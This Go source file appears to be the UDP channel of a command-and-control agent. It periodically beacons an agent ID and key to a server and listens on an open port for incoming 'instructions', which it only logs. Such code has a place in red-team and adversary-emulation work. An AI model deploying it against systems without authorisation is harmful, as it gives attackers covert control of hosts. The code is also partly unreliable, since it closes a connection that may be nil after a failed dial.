package sockets

import (
	"fmt"
	"net"
	"time"
	"math/rand"

	"../output"
)

//UDP communication
type UDP struct { }

func init() {
	CommunicationChannels["udp"] = UDP{}
}

//Listen through a new socket connection
func (contact UDP) Listen(key string, port string, server string, inbound int, profile string) {
	paw := buildPaw()
	updatedProfile := fmt.Sprintf("%s$%s$%s$%d", profile, paw, key, inbound)

	go callMeBack(inbound)

	for {
	   conn, err := net.Dial("udp", port)
	   if err == nil {
			beacon(conn, updatedProfile)
		} else {
			output.VerbosePrint(fmt.Sprintf("[-] %s", err))
		}
		conn.Close()
		time.Sleep(60 * time.Second)
	}
}

func callMeBack(port int) {
	p := make([]byte, 2048)
    addr := net.UDPAddr{
        Port: port,
        IP: net.ParseIP("0.0.0.0"),
    }
    ser, err := net.ListenUDP("udp", &addr)
    if err != nil {
        output.VerbosePrint(fmt.Sprintf("[-] %v\n", err))
        return
    }
    for {
        _,remoteaddr,err := ser.ReadFromUDP(p)
        output.VerbosePrint(fmt.Sprintf("[+] instruction received (%v) %s \n", remoteaddr, p))
        if err !=  nil {
            output.VerbosePrint(fmt.Sprintf("[-] %v", err))
            continue
        }
    }
}

func buildPaw() string {
	rand.Seed(time.Now().UnixNano())
	return fmt.Sprintf("%d", rand.Intn(999999 - 1))
}

func beacon(conn net.Conn, updatedProfile string) {
	output.VerbosePrint("[*] Sending beacon")
	fmt.Fprintf(conn, updatedProfile)
}
